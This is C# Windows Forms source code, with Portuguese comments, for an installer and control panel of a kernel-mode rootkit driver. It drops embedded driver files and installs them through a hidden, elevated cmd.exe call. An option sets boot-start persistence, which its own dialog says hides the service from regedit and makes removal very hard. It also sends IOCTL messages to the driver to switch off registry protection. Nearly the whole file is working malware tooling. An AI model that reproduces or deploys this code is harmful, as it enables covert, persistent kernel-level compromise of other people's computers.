using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.ServiceProcess;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace RootkitInstall
{
    public partial class Form1 : Form
    {

        private class Kernel
        {
            /// Importação da DLL KERNEL32.DLL CreateFile
            /// </summary>
            /// <returns></returns>
            [DllImport("Kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
            public static extern int CreateFile(
                String lpFileName, // Nome da porta
                int dwDesiredAccess, // Acesso
                int dwShareMode, // Compartilhamento
                IntPtr lpSecurityAttributes, // Security
                int dwCreationDisposition, // Disposition
                int dwFlagsAndAttributes, // Atributos
                int hTemplateFile // Arquivo
            );

            /// <summary>
            /// Envia uma mensagem
            /// </summary>
            [DllImport("kernel32.dll", SetLastError = true)]
            public static extern int DeviceIoControl(
                IntPtr hDevice,
                uint dwIoControlCode,
                StringBuilder lpInBuffer,
                int nInBufferSize,
                StringBuilder lpOutBuffer,
                Int32 nOutBufferSize,
                ref Int32 lpBytesReturned,
                IntPtr lpOverlapped
            );

            /// <summary>
            /// Fechar o dispositivo
            /// </summary>
            [DllImport("kernel32", SetLastError = true)]
            public static extern bool CloseHandle(
                IntPtr handle // O que fechar
            );

            // Definições, necessárias
            public static uint FILE_DEVICE_UNKNOWN = 0x00000022;
            public static uint FILE_ANY_ACCESS = 0;
            public static uint METHOD_BUFFERED = 0;
            public static int GENERIC_WRITE = 0x40000000;
            public static int GENERIC_READ = unchecked((int)0x80000000);
            public static int FILE_SHARE_READ = 1;
            public static int FILE_SHARE_WRITE = 2;
            public static int OPEN_EXISTING = 3;
            public static int IOCTL_DISK_GET_DRIVE_LAYOUT_EX = unchecked((int)0x00070050);
            public static int ERROR_INSUFFICIENT_BUFFER = 122;

            /// <summary>
            /// Envia uma mensagem ao nosso driver
            /// </summary>
            /// <param name="mensagem"></param>
            /// <param name="Codigo"></param>
            public static string EnviarMensagem(string mensagem, uint Ctl)
            {
                string StatusRetornar = "Falha!";

                try
                {
                    // Nosso dispositivo de comunicação com o driver
                    IntPtr dispositivo = (IntPtr)CreateFile(
                        "\\\\.\\RootKitSys",
                        GENERIC_READ | GENERIC_WRITE,
                        FILE_SHARE_READ,
                        IntPtr.Zero,
                        OPEN_EXISTING,
                        0,
                        0
                    );

                    // Novos bytes
                    int uCnt = 10;

                    // Mensagem para o kernel
                    StringBuilder enviarAoKernel = new StringBuilder(mensagem);

                    // Mensagem para receber do kernel
                    StringBuilder receberDoKernel = new StringBuilder();

                    // Envie a mensagem
                    DeviceIoControl(

                        // Dispositivo
                        dispositivo,

                        // Nosso código CTL
                        Ctl,

                        // Mensagem para enviar
                        enviarAoKernel,

                        // + 5, para não enviar lixo ao kernel
                        enviarAoKernel.Length + 5,

                        // Receber o kernel
                        receberDoKernel,
                        1,
                        ref uCnt,
                        IntPtr.Zero
                    );

                    StatusRetornar = receberDoKernel.ToString();

                    // Feche o dispositivo
                    CloseHandle(dispositivo);
                }
                catch (Exception) { }

                // Status
                return StatusRetornar;
            }

        }

        public Form1()
        {
            InitializeComponent();
            comboBox1.SelectedIndex = 0;

            try
            {
                ServiceController rootkit = new ServiceController("RootKit");
                if (rootkit.Status == ServiceControllerStatus.Running)
                {
                    label1.Text = "Instalado e rodando!";
                    label1.ForeColor = Color.Green;

                    button1.Text = "Remover rootkit";
                    comboBox1.Visible = false;

                    label2.Visible = true;
                    textBox1.Visible = true;
                } else
                {

                    label1.Text = "Instalado, mas não rodando!";

                    button1.Text = "Iniciar";
                    comboBox1.Visible = false;

                }
            } catch (Exception) { }
        }

        public static async Task IniciarProcesso(string arquivo, string argumento)
        {
            try
            {
                // Inicia um processo
                Process processo = new Process();
                processo.StartInfo.FileName = arquivo;
                processo.StartInfo.Arguments = argumento;

                await Task.Delay(1); // Intervalo

                // Inicia o processo em segundo plano
                processo.StartInfo.Verb = "runas";

                // Oculte
                processo.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;

                processo.Start();
                processo.WaitForExit();
            }
            catch (Exception) { }
        }

        private async void button1_Click(object sender, EventArgs e)
        {
            string msg = button1.Text;

            if (msg == "Remover rootkit")
            {
                if (MessageBox.Show("Certeza?", "Confirmação", MessageBoxButtons.OKCancel) != DialogResult.OK)
                {
                    return;
                }

                string resposta = Kernel.EnviarMensagem("Alterar proteção de registro", 0);

                if (resposta == "Ok, alterado!")
                {
                    try
                    {

                        RegistryKey registro = Registry.LocalMachine.OpenSubKey("SYSTEM\\CurrentControlSet\\Services", true);
                        registro.DeleteSubKeyTree("RootKit");

                        Kernel.EnviarMensagem("Alterar proteção de registro", 0);

                        MessageBox.Show("Sucesso! Reinicie o PC para o rootkit ser removido");
                        Environment.Exit(0);
                    } catch (Exception ex)
                    {
                        MessageBox.Show(ex.Message);
                    }
                } else
                {
                    MessageBox.Show("Falha na resposta do driver!");
                }

            } 
            
            else if (msg == "Iniciar")
            {
                try
                {

                    ServiceController rootkit = new ServiceController("RootKit");
                    rootkit.Start();

                    Kernel.EnviarMensagem("Alterar proteção de registro", 0);

                    RegistryKey registro = Registry.LocalMachine.OpenSubKey("SYSTEM\\CurrentControlSet\\Services\\RootKit", true);
                    registro.SetValue("ImagePath", "system32\\DRIVERS\\RootKit.sys ", RegistryValueKind.ExpandString);

                    Kernel.EnviarMensagem("Alterar proteção de registro", 0);

                    label1.Text = "Instalado e rodando!";
                    label1.ForeColor = Color.Green;

                    button1.Text = "Remover rootkit";
                    comboBox1.Visible = false;

                    label2.Visible = true;
                    textBox1.Visible = true;

                } catch (Exception ex)
                {
                    MessageBox.Show(ex.Message);
                }
            }

            else if (msg == "Instalar Rootkit")
            {
                try
                {
                    bool persistencia = false;

                    if (comboBox1.Text == "Persistência")
                    {
                        if (MessageBox.Show("Instalar o driver no modo persitência (iniciado no boot) vai garantir que ele inicie no modo segurança, e que torne-o extremamente difícil de remover. No entanto, em algumas versões do Windows, depois de reiniciar algumas vezes, ele causará tela azul, e nem deixará você acessar o modo de reparo. E mesmo que acesse, será difícil remove-lo, porque o arquivo não pode ser apagado por meios normais, e o serviço não aparacerá no regedit. Tem certeza que deseja continuar?", "Confirmação", MessageBoxButtons.OKCancel) != DialogResult.OK)
                        {
                            return;
                        }

                        persistencia = true;
                    }

                    string local = Application.StartupPath + "\\driversrootkit\\";

                    Directory.CreateDirectory(local);

                    if (Environment.Is64BitOperatingSystem)
                    {
                        File.WriteAllBytes(local + "Rootkit.sys", Properties.Resources.RootKit);
                    }

                    File.WriteAllBytes(local + "Rootkit.cat", Properties.Resources.rootkit2);

                    File.WriteAllBytes(local + "Rootkit.inf", Properties.Resources.RootKit1);

                    string inf = local + "Rootkit.inf";

                    // Inicie o processo
                    await IniciarProcesso("cmd.exe", "/c C:\\Windows\\System32\\InfDefaultInstall.exe " + '"' + inf + '"');

                    label1.Text = "Instalado, mas não rodando!";

                    button1.Text = "Iniciar";
                    comboBox1.Visible = false;

                    Directory.Delete(local, true);

                    if (persistencia == true)
                    {
                        RegistryKey registro = Registry.LocalMachine.OpenSubKey("SYSTEM\\CurrentControlSet\\Services\\RootKit", true);
                        registro.SetValue("Start", 0, RegistryValueKind.DWord);
                    }

                } catch (Exception ex)
                {
                    MessageBox.Show(ex.Message);
                }
            }

        }
    }
}
